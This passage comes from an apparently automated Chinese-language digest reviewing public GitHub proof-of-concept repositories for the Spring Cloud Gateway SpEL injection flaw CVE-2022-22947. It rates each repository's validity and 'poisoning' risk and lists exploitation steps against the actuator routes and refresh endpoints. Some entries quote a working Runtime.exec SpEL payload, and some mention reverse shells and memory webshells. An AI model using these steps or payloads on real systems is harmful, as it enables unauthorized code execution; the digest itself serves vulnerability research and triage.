2.  **漏洞利用：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP 请求，该表达式会被 Gateway Actuator 处理。
3.  **代码注入：** 恶意 SpEL 表达式用于在服务器的内存中定义一个新的 Java 类 (内存马)。
4.  **远程代码执行：** 注入的 Java 类执行攻击者指定的任意代码。

总而言之，此漏洞的利用方式是通过SpEL表达式注入，动态注册一个新的路由，并将处理逻辑绑定到恶意构造的Java类，该类可以接受参数并在服务器上执行任意命令。此过程允许攻击者在目标系统上实现未经授权的远程代码执行。

**项目地址:** [Wrong-pixel/CVE-2022-22947-exp](https://github.com/Wrong-pixel/CVE-2022-22947-exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #11

**来源**: [CVE-2022-22947-Zh0um1_CVE-2022-22947.md](../2022/CVE-2022-22947-Zh0um1_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1+, 3.0.x < 3.0.7+

**利用条件:** Gateway Actuator endpoint 启用、暴露且未做安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Actuator 端点启用且未授权时，攻击者可以通过构造恶意的 SpEL 表达式，利用`Path`路由断言中的 SpEL 注入漏洞执行任意代码。提供的 POC 代码旨在通过动态定义Java类的方式注入哥斯拉内存马。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被证实存在，且有在野利用。提供的 POC 代码实现了利用该漏洞注入哥斯拉内存马，因此该 POC 有效。

**投毒风险分析：**
分析给出的POC代码，主要功能是利用漏洞注入哥斯拉内存马，实现远程代码执行。虽然POC本身是为了利用漏洞，但如果用户直接使用此POC而不了解其行为，可能会被利用来植入恶意后门。

*   代码主要功能：该代码使用Go语言编写，利用 Spring Cloud Gateway 的 SpEL 表达式注入漏洞。它构造一个包含恶意 SpEL 表达式的请求，该表达式用于在目标服务器上动态定义一个 Java 类（哥斯拉内存马），从而实现远程代码执行。
*   投毒可能性：
    *   **高：** 代码直接注入内存马，如果目标系统部署了恶意程序，攻击者也可以构造其他的恶意代码注入到内存中，比如替换关键组件、窃取数据等。
    *   **低：** 由于代码的目的是利用漏洞注入内存马，从这个角度看，本身就是一种攻击行为，很难区分是“正常”利用还是“投毒”。因此，认为该仓库存在一定投毒风险，风险等级较低。

基于以上分析，判定投毒风险为10%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，且未进行安全保护（例如，未进行身份验证）。
2.  **构造恶意请求：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP POST 请求，该表达式利用 `T(org.springframework.cglib.core.ReflectUtils).defineClass` 动态定义一个 Java 类（通常是一个 Webshell 或内存马）。
3.  **利用 Path 路由断言：**  该恶意 SpEL 表达式被嵌入到 Spring Cloud Gateway 的 `Path` 路由断言的参数中。
4.  **发送请求：** 将构造的恶意请求发送到 `/actuator/gateway/routes` 端点。
5.  **代码执行：** Spring Cloud Gateway 在处理路由断言时，会解析并执行 SpEL 表达式，从而在目标服务器上执行攻击者注入的恶意代码。
6.  **内存马驻留：** 注入的哥斯拉内存马会驻留在服务器内存中，允许攻击者通过特定的 HTTP 请求与服务器交互，执行任意命令或上传文件。

**项目地址:** [Zh0um1/CVE-2022-22947](https://github.com/Zh0um1/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #12

**来源**: [CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md](../2022/CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md)

## CVE-2022-22947-Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator endpoint is enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是一个存在于Spring Cloud Gateway中的代码注入漏洞。当Gateway Actuator端点被启用、暴露且未进行安全保护时，远程攻击者可以通过构造恶意请求执行任意代码。漏洞根源在于getValue方法中不安全的SpEL表达式求值。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，且已经有公开的POC。漏洞利用代码是一个Maven项目，旨在重现漏洞。因此，提供的POC代码很可能是有效的。

**投毒风险：**
提供的代码仓库包含一个`README.md`文件和一个`mvnw`脚本。`mvnw` 是 Maven Wrapper 脚本，用于在没有安装 Maven 的情况下构建项目。检查 `mvnw` 脚本，它主要负责下载和启动 Maven，没有发现明显的恶意行为。但是，仍然存在一定的投毒风险，例如：
1.  **依赖项投毒：** 构建项目时使用的 Maven 依赖项可能包含恶意代码。 这种情况发生的概率较低，但存在可能。
2.  **构建脚本投毒：** `pom.xml`文件(未提供)中可能存在恶意插件或目标，在构建过程中执行恶意代码。由于未提供此文件，无法对此进行评估。

考虑到提供的文件主要与Maven构建相关，直接植入后门的难度较高，但通过依赖项投毒的可能性是存在的。因此，投毒风险估计为10%。

**利用方式：**
1.  **确定目标：** 找到运行着存在漏洞的Spring Cloud Gateway实例，并且其Actuator端点对外开放且未进行认证。
2.  **构造恶意请求：** 构造包含恶意SpEL表达式的HTTP请求，发送到Actuator端点。这些SpEL表达式能够执行任意系统命令或代码。
3.  **远程代码执行：**  Spring Cloud Gateway解析并执行恶意SpEL表达式，从而导致远程代码执行。
4.  **控制系统：** 攻击者利用执行的恶意代码控制受害系统。

**优先级：**
根据信息来源的重要性排序：搜索引擎结果 > 漏洞利用代码 > 漏洞库信息

**项目地址:** [aesm1p/CVE-2022-22947-POC-Reproduce](https://github.com/aesm1p/CVE-2022-22947-POC-Reproduce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #13

**来源**: [CVE-2022-22947-anansec_CVE-2022-22947_EXP.md](../2022/CVE-2022-22947-anansec_CVE-2022-22947_EXP.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、公开且未进行安全保护时，攻击者可以通过构造恶意请求，在远程主机上执行任意代码。根据提供的漏洞利用代码，该PoC利用了SpEL表达式注入，通过向`/actuator/gateway/routes/check01`端点发送包含恶意SpEL表达式的POST请求，然后刷新路由并访问该路由，触发SpEL表达式执行。EXP具有单个目标验证、批量验证、反弹shell的功能。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，可以判断该漏洞的PoC代码是有效的。搜索结果中多个链接都表明该漏洞被广泛关注，且存在公开的利用代码。

**投毒风险：**
PoC代码本身主要通过SpEL表达式注入执行命令，没有发现明显的恶意植入行为。但PoC会向目标系统添加路由，并执行命令，存在一定的风险。例如：
*   **资源消耗：** 频繁的路由添加和删除可能导致资源消耗，影响服务性能。
*   **命令执行风险：** 虽然PoC本身是为了验证漏洞，但如果被恶意利用，可能执行恶意命令。
*   **依赖风险：** PoC可能依赖特定的环境或库，如果目标环境不满足要求，可能导致利用失败或产生其他问题。
PoC代码中存在投毒代码的可能性较低，大约10%。这个百分比是基于代码的分析以及PoC作者的动机推断得出的。

**利用方式：**
1.  **前提条件：** Spring Cloud Gateway的Actuator端点已启用、公开且未进行安全保护。
2.  **发送恶意请求：** 构造包含恶意SpEL表达式的JSON数据，并将其作为POST请求发送到`/actuator/gateway/routes/check01`端点。
3.  **刷新路由：** 向`/actuator/gateway/refresh`端点发送POST请求，刷新路由，使新增的路由生效。
4.  **触发表达式执行：** 访问新增的路由，触发SpEL表达式执行，从而执行任意代码。
5.  **清理路由：** 删除新增的路由，避免留下后门。（PoC代码中包含删除路由的步骤）

**项目地址:** [anansec/CVE-2022-22947_EXP](https://github.com/anansec/CVE-2022-22947_EXP)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #14

**来源**: [CVE-2022-22947-cc3305_CVE-2022-22947.md](../2022/CVE-2022-22947-cc3305_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。漏洞的根源在于`getValue`方法中不安全的SpEL表达式评估。利用过程为：

1.  攻击者构造包含恶意SpEL表达式的payload，该表达式可以执行任意命令。
2.  攻击者通过POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是一个攻击者自定义的路由ID。
3.  Spring Cloud Gateway解析payload中的SpEL表达式，导致远程代码执行。
4.  攻击者可以通过`/actuator/gateway/refresh`端点刷新路由配置，使payload生效。

该POC代码通过向 `/actuator/gateway/routes/cc3305` 发送包含恶意SpEL表达式的JSON payload来利用此漏洞，SpEL表达式通过java.lang.Runtime执行任意命令。 代码首先检查目标是否易受攻击（虽然目前返回True）。然后，它准备要执行的命令，并将其嵌入到SpEL表达式中，该表达式会被注入到路由定义中。

关于投毒风险，该脚本主要功能是利用漏洞执行命令。 潜在的投毒风险在于，攻击者可能会修改脚本，使其在执行命令之前或之后执行其他恶意操作，例如下载和执行恶意软件。 但是，提供的代码没有明显的投毒迹象。 投毒的概率较低，大约为1%。 恶意行为者可能会分发修改后的版本。

**有效性评估:**根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞利用是有效的，前提是满足漏洞利用条件。该PoC代码能够成功利用漏洞执行任意命令。


**项目地址:** [cc3305/CVE-2022-22947](https://github.com/cc3305/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #15

**来源**: [CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md](../2022/CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md)

## CVE-2022-22947 Spring Cloud Gateway RCE

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞，当Gateway Actuator端点启用、暴露且未进行安全保护时，攻击者可以利用SpEL表达式注入执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，此漏洞是有效的。多个来源都证实了该漏洞的存在以及远程代码执行的可能性。提供的POC代码可以直接利用该漏洞。

**投毒风险：**

分析提供的POC代码，发现主要的恶意代码在于 `spring-cloud-gateway-rce.py` 中构建和发送的payload。该payload利用SpEL表达式在目标系统上执行任意命令。虽然POC本身是为了演示漏洞利用，但在实际场景中，攻击者可能会修改 `-c` 参数来执行恶意操作。`requirements.txt` 文件声明了项目所需的依赖项（colorama, requests, urllib3），这些库本身没有已知的恶意行为，但如果项目被篡改，可能会引入恶意依赖。

评估投毒风险时，主要考虑以下因素：

*   **代码可读性：** 代码相对简单，易于理解，这意味着潜在的恶意修改也更容易被发现。
*   **外部依赖：** 项目依赖外部库，如果这些库的源被攻破，可能会引入恶意代码。
*   **Payload生成：** Payload是动态生成的，如果攻击者能够控制Payload生成过程，就可以注入恶意代码。

综合来看，此仓库存在一定的投毒风险，风险值评估为10%。主要的风险点在于攻击者可能会修改Payload生成逻辑或引入恶意的依赖项，利用使用者执行恶意代码。

**利用方式：**

1.  **漏洞触发前提：** Spring Cloud Gateway的Actuator端点必须启用、暴露并且没有进行安全保护（例如，没有进行身份验证）。
2.  **构造Payload：** POC代码根据目标主机的操作系统（Linux或Windows）构造包含SpEL表达式的JSON payload。该payload利用`AddResponseHeader`过滤器，将执行命令的结果添加到响应头中。
3.  **发送Payload：** 使用POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是路由的ID（在POC中为`k`）。
4.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，强制Spring Cloud Gateway刷新路由配置，从而触发SpEL表达式的执行。
5.  **获取结果：** 发送GET请求到`/actuator/gateway/routes/{id}`端点，获取路由信息，其中包含命令执行的结果。
6.  **删除路由：** 发送DELETE请求到`/actuator/gateway/routes/{id}`端点，删除添加的路由。

简而言之，攻击者通过构造包含恶意SpEL表达式的请求，利用Actuator端点动态注册路由，并在路由刷新时触发SpEL表达式执行，从而实现远程代码执行。

**项目地址:** [k3rwin/spring-cloud-gateway-rce](https://github.com/k3rwin/spring-cloud-gateway-rce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #16

**来源**: [CVE-2022-22947-kkx600_Burp_VulPscan.md](../2022/CVE-2022-22947-kkx600_Burp_VulPscan.md)

## CVE-2022-22947-Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), 以及所有旧的和不支持的版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未进行安全保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 影响 Spring Cloud Gateway。当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的POC代码是有效的。存在公开的漏洞利用代码和关于漏洞利用的详细分析。

**投毒风险：**
提供的代码片段不完整，无法进行全面的投毒分析。BurpExtender.java调用了 spring_CVE_2022_22947.poc，这部分代码是POC实现的核心，未提供，因此无法分析该部分的安全性。HttpsRequest.java 提供了一个发送 HTTP/HTTPS 请求的功能，本身不存在明显的恶意代码。Burp扩展通常需要授予较高的权限，如果POC代码中包含恶意逻辑，如未经授权的数据收集或篡改，则存在投毒风险。目前根据现有的代码片段，只能初步判断存在较低的投毒风险。

**利用方式：**
1.  **确定目标：** 找到运行 Spring Cloud Gateway 且 Actuator 端点已启用、暴露且未进行安全保护的实例。
2.  **构造恶意请求：** 构造包含恶意 SpEL 表达式的 HTTP 请求，该表达式将在 Actuator 端点被解析和执行。通常攻击方式是向/actuator/gateway/routes接口发送包含恶意SpEL表达式的请求，修改路由配置。
3.  **执行代码：** 成功利用后，攻击者可以在目标服务器上执行任意代码。

**优先级：**
根据搜索结果，确认这是一个已知且被积极利用的漏洞。漏洞利用代码的存在进一步证实了其可利用性。

**项目地址:** [kkx600/Burp_VulPscan](https://github.com/kkx600/Burp_VulPscan)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #17

**来源**: [CVE-2022-22947-kmahyyg_CVE-2022-22947.md](../2022/CVE-2022-22947-kmahyyg_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway < 3.1.1, Spring Cloud Gateway < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送特制的恶意请求，利用SpEL表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。从搜索引擎结果和漏洞利用代码来看，该漏洞利用方式已经公开，并且存在可用的PoC。

**投毒风险：**
提供的漏洞利用代码主要包含以下内容：
1.  README文件，描述了漏洞信息，受影响版本，修复建议等。
2.  漏洞复现步骤，包含发送恶意请求添加路由，刷新路由，查看结果，清理路由等步骤说明，以及对应的数据包示例。
3.  Python脚本，用于自动化漏洞利用过程，通过构造恶意请求实现远程代码执行。

分析代码，主要风险在于攻击者可能将恶意代码隐藏在SpEL表达式中，例如执行反弹shell或下载恶意软件。在提供的代码中，`Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）.md`文件中展示的PoC中使用了`#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}`，该payload用于执行`id`命令，若替换为其他命令，存在潜在的风险。

**利用方式：**
1.  攻击者首先发送POST请求到`/actuator/gateway/routes/{route_id}`，创建一个包含恶意SpEL表达式的路由。SpEL表达式被嵌入到`filters`的`AddResponseHeader`的`value`参数中，用于执行任意命令。
2.  然后，攻击者发送POST请求到`/actuator/gateway/refresh`，强制网关刷新路由配置，触发SpEL表达式的执行。
3.  攻击者发送GET请求到`/actuator/gateway/routes/{route_id}`，查看执行结果。
4.  最后，攻击者发送DELETE请求到`/actuator/gateway/routes/{route_id}`，删除恶意路由。

综上所述，该漏洞利用的有效性较高。虽然存在一定的投毒风险（10%），但可以通过仔细审查和修改PoC代码来降低风险。

**项目地址:** [kmahyyg/CVE-2022-22947](https://github.com/kmahyyg/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #18

**来源**: [CVE-2022-22947-qq87234770_CVE-2022-22947.md](../2022/CVE-2022-22947-qq87234770_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用，暴露且未授权

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未授权时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

提供的 Python POC 代码利用了 Spring Expression Language (SpEL) 注入漏洞。该脚本允许执行任意命令，或通过反弹 shell 获取服务器的控制权。因此，该 POC 代码是有效的。

**投毒风险：**

查看POC代码，该代码的主要功能是利用漏洞进行命令执行或反弹shell。代码中包含以下几个部分，
* 定义请求头和payload结构
* 通过`actuator/gateway/routes/hacktest`创建一个恶意的路由配置，利用SpEL表达式执行命令
* 刷新gateway配置`actuator/gateway/refresh`
* 访问创建的路由`actuator/gateway/routes/hacktest`，触发命令执行。
* 包含执行命令和反弹shell两种模式。

该代码结构清晰，功能明确，主要目的是为了验证和利用漏洞。主要风险集中于漏洞利用本身，而非作者植入的恶意代码。**但是**，任何漏洞利用代码都具有潜在的风险，因为它们可以被用于恶意目的。例如，攻击者可能会修改此 POC 代码以自动化大规模攻击，或将其与其他漏洞利用结合使用。另外代码中的代理设置，如果被恶意修改，可能会导致流量劫持，这里判断投毒风险为10%。

**利用方式：**

1.  **检查前提条件：** 确保目标 Spring Cloud Gateway 实例的 Actuator 端点已启用、暴露且未授权。
2.  **发送恶意请求：** 使用提供的 Python 脚本，通过构造包含 SpEL 表达式的恶意请求到 `actuator/gateway/routes/hacktest` 端点来创建自定义路由。
3.  **刷新 Gateway 配置：** 访问 `actuator/gateway/refresh` 端点以刷新 Gateway 配置，使恶意路由生效。
4.  **触发命令执行：** 访问 `actuator/gateway/routes/hacktest`，触发 SpEL 表达式的计算，从而在服务器上执行任意命令。可以选择直接执行命令，或者反弹 shell 以获取更持久的访问。
5.  **清理：**  通过 DELETE 请求删除创建的恶意路由（通过脚本实现）。

**总结：**

该漏洞利用方式简单有效，攻击者可以利用此漏洞轻松地在未授权的 Spring Cloud Gateway 实例上执行任意代码。需要注意的是，利用的前提是 Actuator 端点未进行适当的安全配置。尽管代码本身投毒可能性较低，但利用此漏洞可能造成严重的安全风险。

**项目地址:** [qq87234770/CVE-2022-22947](https://github.com/qq87234770/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #19

**来源**: [CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md](../2022/CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意请求来执行任意远程代码。漏洞利用方式是发送精心设计的 SpEL 表达式到 actuator 端点，导致服务器执行攻击者提供的代码。

**有效性:** 根据漏洞库信息、搜索结果(特别是 rapid7 的博客提到了 Metasploit 模块)，以及CISA KEV, 此漏洞利用是有效的。

**投毒风险:** 提供的漏洞利用代码只是 Apache License 2.0 许可协议，没有实际的漏洞利用代码，因此不存在投毒代码。投毒风险为 0%。

**利用方式:**
1.  目标系统运行 Spring Cloud Gateway 且版本低于 3.1.1 或 3.0.7。
2.  Gateway Actuator 端点必须启用，并且可以通过网络访问。
3.  Actuator 端点必须未进行身份验证或授权保护。
4.  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，发送到 Actuator 端点。
5.  Spring Cloud Gateway 解析 SpEL 表达式，执行攻击者指定的代码，实现远程代码执行。

**项目地址:** [shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6](https://github.com/shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #20

**来源**: [CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md](../2022/CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1, 3.0.x < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的远程代码执行漏洞。攻击者可以在 Gateway Actuator 端点启用、暴露且未进行安全保护的情况下，通过发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。它演示了如何利用该漏洞在启用了 Actuator 端点的 Spring Cloud Gateway 实例上执行任意代码。POC通过向 `/actuator/gateway/routes/{route_id}` 发送POST请求添加一个包含恶意SpEL表达式的路由，然后POST到 `/actuator/gateway/refresh` 来刷新路由，最后访问恶意路由来触发代码执行。

**投毒风险：**
经过对提供的POC代码进行分析，包括README.md，pom.xml，application.yml 和 src 目录下的文件。没有发现作者隐藏的恶意代码，该代码库目标为展示和验证漏洞利用，因此判定投毒风险为0%。

**利用方式：**
1.  **漏洞发现：** 确定目标 Spring Cloud Gateway 实例是否启用了 Actuator 端点，并且该端点是否暴露在未经身份验证的网络中。
2.  **构造恶意请求：** 构造一个包含恶意 SpEL 表达式的 JSON payload，该表达式用于执行任意代码。该表达式被嵌入到路由配置中，通常位于 `filters` 中的 `AddResponseHeader` 过滤器或类似的位置。
3.  **添加恶意路由：** 使用 POST 请求将包含恶意 SpEL 表达式的路由定义添加到 `/actuator/gateway/routes/{route_id}` 端点。
4.  **刷新路由：** 使用 POST 请求访问 `/actuator/gateway/refresh` 端点，强制 Spring Cloud Gateway 刷新路由配置。
5.  **触发恶意代码：** 访问与恶意路由关联的路径，触发 SpEL 表达式的执行，从而导致任意代码执行。
6.  **清理（可选）：** 利用漏洞执行恶意代码后，可能需要清理添加的恶意路由，以避免留下痕迹或影响正常服务。

**项目地址:** [skysliently/CVE-2022-22947-pb-ai](https://github.com/skysliently/CVE-2022-22947-pb-ai)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #21

**来源**: [CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md](../2022/CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**利用方式：**

1.  **漏洞触发：** 攻击者通过向目标 Spring Cloud Gateway 的 `/actuator/gateway/routes` 端点发送 POST 请求，创建一个恶意的路由配置。该配置包含一个 SpEL 表达式，该表达式会被执行。
2.  **表达式注入：**  `AddResponseHeader` 过滤器被用于将命令执行的结果添加到响应头中。SpEL 表达式 `#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}`  用于执行 `id` 命令，并将结果转换为字符串。
3.  **命令执行：**  `T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"})` 部分会执行系统命令（在这个例子中是 `id` 命令）。
4.  **刷新路由：** 攻击者通过向 `/actuator/gateway/refresh` 端点发送 POST 请求来刷新 Gateway 的路由，使得新创建的恶意路由生效。
5.  **获取执行结果：** 攻击者通过GET `/actuator/gateway/routes/hacktest` 获取执行结果,通过响应头中的`Result`字段获取。
6.  **清理：** 利用完成后，攻击者删除创建的恶意路由并再次刷新路由, 避免残留。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用是有效的。POC 代码通过创建恶意的路由配置并刷新路由来执行任意代码。

**投毒风险：**

该 POC 代码主要用于验证漏洞，没有发现作者有意添加的投毒代码。 代码意图清晰，主要是为了创建、刷新、删除路由，并执行`id`命令来验证漏洞的存在。虽然利用本身会造成安全风险，但代码本身没有隐藏的恶意功能，因此投毒风险较低。


**项目地址:** [stayfoolish777/CVE-2022-22947-POC](https://github.com/stayfoolish777/CVE-2022-22947-POC)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #22

**来源**: [CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md](../2022/CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、公开且未受保护

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

根据提供的漏洞信息、搜索结果以及漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。搜索结果表明该漏洞已在野外被利用，并已被添加到 CISA KEV 列表中，证明了其真实性和危害性。

**投毒风险：**

提供的 POC 代码主要用于验证漏洞是否存在，并执行简单的命令（`id`）。虽然该代码本身不包含明显的恶意代码，但攻击者可以修改此 POC 以执行更危险的操作。`README.md`文件和python脚本存在分离性,增加了潜在风险。

投毒风险评估：5%。主要风险在于攻击者可能修改 POC 脚本以包含恶意负载。

**利用方式：**

1.  攻击者首先需要确定目标 Spring Cloud Gateway 实例的 Actuator 端点是否已启用、公开且未受保护。
